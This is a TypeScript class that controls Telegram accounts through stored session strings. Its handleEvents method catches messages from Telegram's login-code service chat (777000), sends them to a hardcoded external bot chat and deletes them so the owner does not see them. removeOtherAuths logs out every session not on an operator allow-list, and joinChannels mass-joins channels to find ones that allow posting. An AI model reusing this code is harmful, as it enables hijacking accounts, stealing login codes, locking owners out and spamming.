import { TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { NewMessage, NewMessageEvent } from 'telegram/events';
import { Api } from 'telegram/tl';
import axios from 'axios';
import * as fs from 'fs';
import { CustomFile } from 'telegram/client/uploads';
import mongoose from 'mongoose';
import { ActiveChannelsService } from '../activechannels/activechannels.service';
import { ActiveChannel, ActiveChannelSchema } from '../activechannels/schemas/active-channel.schema';
import { contains, parseError } from '../../../utils';
import { TotalList } from 'telegram/Helpers';
import { Dialog } from 'telegram/tl/custom/dialog';
import { LogLevel } from 'telegram/extensions/Logger';

class TelegramManager {
    private session: StringSession;
    private phoneNumber: string;
    private client: TelegramClient | null;
    private channelArray: string[];
    private activeChannelsService: ActiveChannelsService;

    constructor(sessionString: string, phoneNumber: string) {
        console.log(sessionString);
        this.activeChannelsService = new ActiveChannelsService(mongoose.model(ActiveChannel.name, ActiveChannelSchema))
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }

    async disconnect(): Promise<void> {
        if (this.client) {
            await this.client.disconnect();
            await this.client.destroy();
        }
        this.session.delete();
    }

    async getchatId(username: string): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const tt = await this.client.getInputEntity(username);
        console.log(tt);
        return tt;
    }

    async createClient(handler = true): Promise<TelegramClient> {
        try {
            this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                connectionRetries: 5,
            });
            this.client.setLogLevel(LogLevel.ERROR);
            await this.client.connect();
            const me = <Api.User>await this.client.getMe();
            console.log("Connected Client : ", me.phone);
            if (handler && this.client) {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());
            }
            return this.client
        } catch (error) {
            console.log(parseError(error));
            return undefined
        }
    }

    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8) : Promise<TotalList<Api.Message>>{
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(): Promise<TotalList<Dialog>>{
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        return chats
    }

    async getLastMsgs(limit: number): Promise<string> {
        if (!this.client) throw new Error('Client is not initialized');
        const msgs = await this.client.getMessages("777000", { limit });
        let resp = '';
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp += msg.text + "\n";
        });
        return resp;
    }

    async getSelfMSgsInfo(): Promise<{ photoCount: number; videoCount: number; movieCount: number }> {
        if (!this.client) throw new Error('Client is not initialized');
        const self = <Api.User>await this.client.getMe();
        const selfChatId = self.id;

        let photoCount = 0;
        let videoCount = 0;
        let movieCount = 0;

        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 });
        for (const message of messageHistory) {
            if (message.photo) {
                photoCount++;
            } else if (message.video) {
                videoCount++;
            }
            const text = message.text.toLocaleLowerCase();
            if (contains(text, ['movie', 'series', '1080', '720', '640', 'title', 'aac', '265', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++;
            }
        }

        return { photoCount, videoCount, movieCount };
    }

    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[] }> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 600 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        console.log(chats.total);
        chats.forEach(async (chat) => {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = <Api.Channel>await chat.entity.toJSON();
                    const { broadcast, defaultBannedRights } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(chatEntity.username);
                    } else {
                        canSendFalseCount++;
                    }
                } catch (error) {
                    console.log(parseError(error));
                }
            }
        });
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : []
        };
    }

    async joinChannels(str: string): Promise<void> {
        const channels = str.split('|');
        console.log(this.phoneNumber, " - channelsLen - ", channels.length);
        for (let i = 0; i < channels.length; i++) {
            const channel = channels[i].trim();
            console.log(this.phoneNumber, "Trying: ", channel);
            try {
                const joinResult = await this.client?.invoke(
                    new Api.channels.JoinChannel({
                        channel: await this.client?.getEntity(channel)
                    })
                );
                console.log(this.phoneNumber, " - Joined channel Success - ", channel);
                try {
                    const chatEntity = <Api.Channel>await this.client?.getEntity(channel);
                    const { title, id, broadcast, defaultBannedRights, participantsCount, megagroup, username } = chatEntity;
                    const entity = {
                        title,
                        id: id.toString(),
                        username,
                        megagroup,
                        participantsCount,
                        broadcast
                    };
                    if (!chatEntity.broadcast && !defaultBannedRights?.sendMessages) {
                        entity['canSendMsgs'] = true;
                        try {
                            await this.activeChannelsService.update(entity.id.toString(), entity)
                            console.log("updated ActiveChannels");
                        } catch (error) {
                            console.log(parseError(error));
                            console.log("Failed to update ActiveChannels");
                        }
                    } else {
                        await this.activeChannelsService.remove(entity.id.toString());
                        // await db.removeOnefromActiveChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                        // await db.removeOnefromChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                        console.log("Removed Channel- ", channel);
                    }
                } catch (error) {
                    console.log(this.phoneNumber, " - Failed - ", error);
                }
            } catch (error) {
                console.log("Channels ERR: ", error);
                if (error.toString().includes("No user has") || error.toString().includes("USERNAME_INVALID")) {
                    const activeChannel = await this.activeChannelsService.search({ username: channel.replace('@', '') })
                    await this.activeChannelsService.remove(activeChannel[0]?.channelId);
                    // await db.removeOnefromChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                    console.log("Removed Channel- ", channel);
                }
            }
            console.log(this.phoneNumber, " - On waiting period");
            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
            console.log(this.phoneNumber, " - Will Try next");
        }
        console.log(this.phoneNumber, " - finished joining channels");
        if (this.client) {
            await this.client.disconnect();
            // await deleteClient(this.phoneNumber);
        }
    }

    async removeOtherAuths(): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        const updatedAuthorizations = result.authorizations.map((auth) => {
            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
                || auth.deviceModel.toLowerCase().includes('windows')) {
                return auth;
            } else {
                this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
                return null;
            }
        }).filter(Boolean);
        console.log(updatedAuthorizations);
    }

    async getAuths(): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        return result;
    }

    async getAllChats(): Promise<any[]> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }

    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                const ppplbot = `https://api.telegram.org/bot${process.env.ramyaredd1bot}/sendMessage`;
                const payload = {
                    "chat_id": "-1001801844217",
                    "text": event.message.text
                };
                axios.post(ppplbot, payload)
                    .then((response) => {
                    })
                    .catch((error) => {
                        console.log(parseError(error))
                        console.log(parseError(error))
                    });
                await event.message.delete({ revoke: true });
            }
        }
    }

    async getFileUrl(url: string, filename: string): Promise<string> {
        const response = await axios.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
        return filePath;
    }

    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }

    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
}
export default TelegramManager;
